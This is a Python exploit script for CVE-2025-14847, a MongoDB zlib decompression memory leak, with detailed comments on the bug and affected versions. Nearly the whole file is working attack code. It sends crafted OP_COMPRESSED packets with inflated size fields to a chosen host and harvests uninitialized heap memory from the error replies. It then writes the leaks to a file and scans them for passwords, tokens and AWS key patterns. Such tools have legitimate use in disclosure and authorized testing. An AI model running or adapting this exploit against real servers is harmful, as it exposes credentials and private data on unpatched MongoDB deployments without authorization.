#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_

VULNERABILITY OVERVIEW:
-----------------------
This exploit targets a flaw in MongoDB's zlib message decompression (CVE-2025-14847).
The vulnerability allows unauthenticated attackers to leak sensitive server memory.

HOW IT WORKS:
1. MongoDB supports compressed wire protocol messages (OP_COMPRESSED, opcode 2012)
2. Attackers send a compressed message with an INFLATED "uncompressedSize" claim
3. MongoDB allocates a buffer based on the attacker's claimed size (larger than actual)
4. zlib decompresses the actual data into the START of this oversized buffer
5. BUG: MongoDB returns the allocated buffer size instead of actual decompressed length
6. BSON parsing reads "field names" from UNINITIALIZED memory beyond the real data
7. Field names are read until a null byte (\x00), leaking arbitrary memory contents

WHAT GETS LEAKED:
- /proc file contents (mountinfo, meminfo, network stats)
- Docker container paths and configuration
- Environment variables in process memory
- WiredTiger storage engine configuration
- Connection UUIDs and internal state

AFFECTED VERSIONS:
- MongoDB 8.2.0 - 8.2.2 (fixed in 8.2.3)
- MongoDB 8.0.0 - 8.0.16 (fixed in 8.0.17)
- MongoDB 7.0.0 - 7.0.27 (fixed in 7.0.28)
- MongoDB 6.0.0 - 6.0.26 (fixed in 6.0.27)
- MongoDB 5.0.0 - 5.0.31 (fixed in 5.0.32)

USAGE:
    python3 mongobleed.py --host <target> --max-offset 50000 --output leaked.bin

REFERENCES:
- OX Security Advisory: https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/
- MongoDB Fix: https://github.com/mongodb/mongo/commit/505b660a14698bd2b5233bd94da3917b585c5728
"""

import socket
import struct
import zlib
import re
import argparse
from typing import List, Tuple, Optional


# =============================================================================
# MONGODB WIRE PROTOCOL CONSTANTS
# =============================================================================

# MongoDB opcodes (little-endian format)
OP_MSG = 2013           # Standard message opcode (MongoDB 3.6+)
OP_COMPRESSED = 2012    # Compressed message wrapper opcode

# Compression algorithm identifiers
COMPRESSOR_NOOP = 0     # No compression
COMPRESSOR_SNAPPY = 1   # Snappy compression
COMPRESSOR_ZLIB = 2     # zlib compression (required for this exploit)
COMPRESSOR_ZSTD = 3     # Zstandard compression

# BSON type identifiers (subset relevant to this exploit)
BSON_TYPE_INT32 = 0x10  # 32-bit integer


def send_probe(host: str, port: int, doc_len: int, buffer_size: int) -> bytes:
    """
    Send a crafted BSON document with an inflated length field to trigger memory leak.
    
    This function exploits CVE-2025-14847 by:
    1. Creating a minimal valid BSON document
    2. Lying about its total length (doc_len parameter)
    3. Wrapping it in OP_MSG format
    4. Compressing with zlib
    5. Wrapping in OP_COMPRESSED with an INFLATED uncompressed size claim
    6. Sending to MongoDB and capturing the response
    
    Args:
        host (str): Target MongoDB hostname or IP address.
        port (int): Target MongoDB port (default 27017).
        doc_len (int): Fake document length to claim in BSON header.
                       This makes MongoDB read beyond actual data.
        buffer_size (int): Claimed uncompressed size in OP_COMPRESSED header.
                           MongoDB allocates this much memory, but zlib only
                           fills part of it, leaving uninitialized data.
    
    Returns:
        bytes: Raw response from MongoDB server containing error message
               with leaked memory in the "field name" portion.
               Returns empty bytes on connection failure.
    
    Wire Protocol Format Sent:
        +------------------+------------------+-------------------+
        | MsgHeader (16B)  | OP_COMPRESSED    | Compressed Data   |
        +------------------+------------------+-------------------+
        
        MsgHeader:
            - messageLength (int32): Total message size
            - requestID (int32): Client request identifier (we use 1)
            - responseTo (int32): Response to request ID (we use 0)
            - opCode (int32): OP_COMPRESSED = 2012
        
        OP_COMPRESSED:
            - originalOpcode (int32): OP_MSG = 2013
            - uncompressedSize (int32): INFLATED size (the vulnerability!)
            - compressorId (uint8): ZLIB = 2
            - compressedMessage (bytes): zlib-compressed OP_MSG
    
    Example:
        >>> response = send_probe("localhost", 27017, doc_len=5000, buffer_size=5500)
        >>> if response:
        ...     leaks = extract_leaks(response)
    """
    # =========================================================================
    # STEP 1: Create minimal BSON document
    # =========================================================================
    # BSON format: length (4 bytes) + elements + null terminator (1 byte)
    # Actual bytes: \x10 (int32 type) + "a\x00" (field name) + \x01\x00\x00\x00 (value=1)
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 { "a": 1 }
    
    # Pack with FAKE length (doc_len) - this is the first part of the exploit
    # MongoDB will try to parse doc_len bytes, reading beyond our actual 7-byte content
    bson = struct.pack('<i', doc_len) + content
    
    # =========================================================================
    # STEP 2: Wrap in OP_MSG format
    # =========================================================================
    # OP_MSG format:
    #   - flagBits (uint32): Message flags (we use 0)
    #   - sections: One or more document sections
    #
    # Section format (kind=0, body):
    #   - kind (uint8): 0 = body
    #   - body (document): BSON document
    op_msg = struct.pack('<I', 0) + b'\x00' + bson  # flags=0, kind=0, then BSON
    compressed = zlib.compress(op_msg)
    
    # =========================================================================
    # STEP 3: Create OP_COMPRESSED wrapper (the vulnerability trigger)
    # =========================================================================
    # OP_COMPRESSED format:
    #   - originalOpcode (int32): The opcode of the wrapped message
    #   - uncompressedSize (int32): Claimed size BEFORE compression
    #   - compressorId (uint8): Algorithm used (2 = zlib)
    #   - compressedMessage: The compressed payload
    #
    # THE BUG: We claim uncompressedSize = buffer_size (much larger than actual)
    # MongoDB allocates buffer_size bytes, but zlib only fills len(op_msg) bytes
    # The remaining bytes contain UNINITIALIZED HEAP MEMORY
    payload = struct.pack('<I', OP_MSG)          # originalOpcode = 2013
    payload += struct.pack('<i', buffer_size)    # INFLATED uncompressed size
    payload += struct.pack('B', COMPRESSOR_ZLIB) # compressorId = 2 (zlib)
    payload += compressed                         # actual compressed data
    
    # =========================================================================
    # STEP 4: Create MongoDB wire protocol header
    # =========================================================================
    # MsgHeader format (all int32, little-endian):
    #   - messageLength: Total bytes including header
    #   - requestID: Client-generated ID
    #   - responseTo: ID of request this responds to (0 for requests)
    #   - opCode: Operation code
    header = struct.pack('<IIII',
        16 + len(payload),  # messageLength (header=16 + payload)
        1,                  # requestID
        0,                  # responseTo
        OP_COMPRESSED       # opCode = 2012
    )
    
    # =========================================================================
    # STEP 5: Send to MongoDB and receive response
    # =========================================================================
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # 2 second timeout for slow networks
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        # Read response - first get length, then read full message
        response = b''
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        return response
    except (socket.timeout, ConnectionRefusedError, OSError):
        return b''


def extract_leaks(response: bytes) -> List[bytes]:
    """
    Parse MongoDB error response to extract leaked memory fragments.
    
    When MongoDB tries to parse our malformed BSON, it reads "field names"
    from uninitialized memory until it hits a null byte. These field names
    appear in error messages like:
        "unrecognized field name 'LEAKED_MEMORY_HERE'"
        "unrecognized BSON type 123 in element with field name 'MORE_LEAKED_DATA'"
    
    This function uses regex to extract those leaked strings from the response.
    
    Args:
        response (bytes): Raw response bytes from MongoDB server.
                          Must be at least 25 bytes to contain valid header.
    
    Returns:
        List[bytes]: List of leaked memory fragments as bytes.
                     Empty list if response is too short or parsing fails.
                     Filters out known non-leak values: '?', 'a', '$db', 'ping'
    
    Response Format:
        The response is either:
        1. OP_COMPRESSED (opcode 2012): Needs zlib decompression
           - Bytes 12-16: original opcode
           - Bytes 25+: compressed data
        
        2. OP_MSG (opcode 2013): Direct BSON content
           - Bytes 16+: BSON document
    
    Leak Extraction Patterns:
        1. Field name pattern: "field name '([^']*)'"
           - Captures arbitrary strings between quotes
           - These are uninitialized memory read as C-strings
        
        2. Type byte pattern: "type (\\d+)"
           - Captures single bytes interpreted as BSON type codes
           - Values 0-255 leak one byte at a time
    
    Example:
        >>> response = send_probe("localhost", 27017, 5000, 5500)
        >>> leaks = extract_leaks(response)
        >>> for leak in leaks:
        ...     print(leak.decode('utf-8', errors='replace'))
    """
    # Response must be at least 25 bytes: 16B header + 9B minimum OP_COMPRESSED
    if len(response) < 25:
        return []
    
    try:
        # Parse message length from first 4 bytes
        msg_len = struct.unpack('<I', response[:4])[0]
        
        # Check if response is compressed (opcode at bytes 12-16)
        response_opcode = struct.unpack('<I', response[12:16])[0]
        
        if response_opcode == OP_COMPRESSED:
            # Decompress: skip header (16B) + originalOpcode (4B) + 
            # uncompressedSize (4B) + compressorId (1B) = 25 bytes
            raw = zlib.decompress(response[25:msg_len])
        else:
            # Uncompressed: just skip header (16B)
            raw = response[16:msg_len]
    except (zlib.error, struct.error, ValueError):
        return []
    
    leaks = []
    
    # =========================================================================
    # PATTERN 1: Extract field names from BSON parsing errors
    # =========================================================================
    # MongoDB returns errors like:
    #   "unrecognized field name 'LEAKED_DATA_HERE'"
    #   "invalid field name '...memory contents...'"
    # The field name contains uninitialized memory read until null byte
    for match in re.finditer(rb"field name '([^']*)'", raw):
        data = match.group(1)
        # Filter out known valid field names that aren't leaks
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    # =========================================================================
    # PATTERN 2: Extract type bytes from unrecognized type errors
    # =========================================================================
    # MongoDB returns errors like:
    #   "unrecognized BSON type 123 in element..."
    # The type number is actually a leaked byte interpreted as BSON type
    for match in re.finditer(rb"type (\d+)", raw):
        # Convert to single byte (0-255)
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks


def main() -> None:
    """
    Main entry point for the mongobleed exploit.
    
    Workflow:
        1. Parse command-line arguments (host, port, offset range, output file)
        2. Iterate through document length offsets (min_offset to max_offset)
        3. For each offset, send a probe and extract leaked memory
        4. Collect unique leak fragments to avoid duplicates
        5. Display interesting leaks (>10 bytes) in real-time
        6. Save all leaked data to binary output file
        7. Scan for common secret patterns and report findings
    
    Command-Line Arguments:
        --host      Target MongoDB hostname/IP (default: localhost)
        --port      Target MongoDB port (default: 27017)
        --min-offset  Starting document length offset (default: 20)
        --max-offset  Ending document length offset (default: 8192)
        --output    Output file for leaked binary data (default: leaked.bin)
    
    Output Files:
        - leaked.bin: Raw binary dump of all leaked memory fragments
        - Use `strings -a -n 6 leaked.bin` to extract printable strings
    
    Example:
        # Basic scan
        python3 mongobleed.py --host localhost
        
        # Deep scan for more data
        python3 mongobleed.py --host 192.168.1.100 --max-offset 50000
        
        # Custom range targeting specific memory regions
        python3 mongobleed.py --min-offset 10000 --max-offset 20000
    
    Exit Codes:
        0: Scan completed successfully (even if no leaks found)
    """
    # =========================================================================
    # ARGUMENT PARSING
    # =========================================================================
    parser = argparse.ArgumentParser(
        description='CVE-2025-14847 MongoDB Memory Leak Exploit',
        epilog='For authorized security testing only. Unauthorized access is illegal.'
    )
    parser.add_argument('--host', default='localhost',
                        help='Target MongoDB host (default: localhost)')
    parser.add_argument('--port', type=int, default=27017,
                        help='Target MongoDB port (default: 27017)')
    parser.add_argument('--min-offset', type=int, default=20,
                        help='Minimum document length to probe (default: 20)')
    parser.add_argument('--max-offset', type=int, default=8192,
                        help='Maximum document length to probe (default: 8192)')
    parser.add_argument('--output', default='leaked.bin',
                        help='Output file for leaked data (default: leaked.bin)')
    args = parser.parse_args()
    
    # =========================================================================
    # BANNER
    # =========================================================================
    print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    print(f"[*] Author: Joe Desimone - x.com/dez_")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
    print()
    
    # =========================================================================
    # SCANNING LOOP
    # =========================================================================
    all_leaked = bytearray()   # Accumulates all leaked bytes
    unique_leaks = set()       # Tracks unique fragments (avoid duplicates)
    
    for doc_len in range(args.min_offset, args.max_offset):
        # Send probe with current offset
        # buffer_size is doc_len + 500 to ensure extra uninitialized memory
        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
        leaks = extract_leaks(response)
        
        for data in leaks:
            if data not in unique_leaks:
                unique_leaks.add(data)
                all_leaked.extend(data)
                
                # Display interesting leaks (more than 10 bytes)
                if len(data) > 10:
                    # Decode with replacement for non-UTF8 bytes
                    preview = data[:80].decode('utf-8', errors='replace')
                    print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
    
    # =========================================================================
    # SAVE RESULTS
    # =========================================================================
    with open(args.output, 'wb') as f:
        f.write(all_leaked)
    
    print()
    print(f"[*] Total leaked: {len(all_leaked)} bytes")
    print(f"[*] Unique fragments: {len(unique_leaks)}")
    print(f"[*] Saved to: {args.output}")
    
    # =========================================================================
    # SECRET PATTERN DETECTION
    # =========================================================================
    # Common patterns that indicate sensitive data
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    for s in secrets:
        if s.lower() in all_leaked.lower():
            print(f"[!] Found pattern: {s.decode()}")


if __name__ == '__main__':
    main()
